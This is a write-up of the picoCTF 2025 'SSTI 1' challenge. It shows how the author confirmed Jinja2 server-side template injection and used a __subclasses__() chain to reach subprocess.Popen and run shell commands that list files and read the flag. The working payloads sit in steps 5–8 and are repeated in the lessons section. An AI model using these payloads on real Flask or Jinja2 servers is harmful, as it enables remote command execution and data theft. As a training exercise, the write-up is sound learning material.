# Challenge: SSTI 1

## Details

- Source: picoCTF 2025
- Category: Web Exploitation
- Difficulty: Easy
- Date Completed: 09.07.2025
- A website was provided


## Description

I made a cool website where you can announce whatever you want! Try it out!


## Hints

1. Server Side Template Injection


## Tools

No external tools were used. The exploitation was done manually through payload crafting and testing.


## Steps Taken

1. As hint suggested, I checked the given website for SSTI vulnerabilities by testing `{{7*7}}`. 

2. As expected, I got `49` as output. This confirmed SSTI as it showed the server evaluates user input.

3.  In order to ensure which template engine was used I tested `{{7*'7'}}`.

3. The output was `7777777`, suggesting a Python string behavior. With some further research, I came to a conclusion the template engine I was dealing with was Jinja2 (common in Flask apps), which is very vulnerable. 

4. To ensure it was Jinja2, I did further tests.

    -  `{{''.__class__}}` Expected output: `<class 'str'>`
    - '{{''.__class__.__mro__}} Expected output: `(<class 'str'>, <class 'object'>)

    These outputs confirmed once more that the user input runs Python code inside Jinja2

5. Next step was to find `subprocess.Popen` to execute shell commands. I used a loop to find the index of `Popen`:

    ```bash
    {% for c in 1.__class__.__mro__[1].__subclasses__() %}
          {% if 'Popen' in c.__name__ %}
             {{ loop.index0 }}: {{ c }}
         {% endif %}
    {% endfor %}
    ```

6. The loop found the index of the `Popen` which was 356.

7. I modified the payload to use `ls` command.
 
    ```bash
    {{ 1.__class__.__mro__[1].__subclasses__()[356]('ls', shell=True, stdout=-1).communicate() }}
    ```

8. The output showed a `flag` and a `requirements.txt`. As the name suggested, I read the content of the `flag` to obtain the flag. For this, I used the payload below.

    ```bash
    {{ 1.__class__.__mro__[1].__subclasses__()[356]('cat flag', shell=True, stdout=-1).communicate() }}
    ```


## What I learned

1. SSTI - Server Side Template Injections lets hackers to exploit a template'snative syntax and inject malicious payloads.

2. In order to detect SSTI, we can try a sequence of special symbols and see which sequence gives an error: `${{<%[%'"}}%`
From there, to indentify which template engine we are dealing with, we use a decision tree. Google research comes in handy here.

3. After identifying the template engine, it is important to look at the offical documentation and get familiar with the syntax, especially how to start and end print statements and control flows/block statements.

4. We can do further Google research to develop a payload. In my case, I learnt that in Jinja2 `subprocess.Popen` allows us to run shell commends. Therefore, my main goal was to locate its index.

5. In Python everything is an object. 

    - `__clas__` - shows the class of an object

    - `__mro__` - Method Resolution Order, returns a tuple showing inheritance chain

    - `__subclasses__()` - returns a list of all classes that inherit from a given class

6. Using this list of classes and understanding basic syntax of loops and conditions, I managed to find the index of `subprocess.Popen`

7. Using `Popen` it is possible to run shell commands. The syntax is as follows: `{{ 1.__class__.__mro__[1].__subclasses__()[356]('cat flag', shell=True, stdout=-1).communicate() }}`.

    - `'cat flag'` - is the command we want to execute
    - `shell=True` - run the command via the shell
    - `stdout=-1` - capture the standard output for us to read later
    - `communicate()` - waits for the command to finish and returns the output



## Helpful References

1. [Official Jinja2 Documentation](https://jinja.palletsprojects.com/en/stable/templates/)

2. [TryHackMe SSTI Room](https://tryhackme.com/room/learnssti)

3. [Server-Side Template Injections Explained](https://youtu.be/SN6EVIG4c-0?si=4Hp4zZ4L7YHILJv7)
 
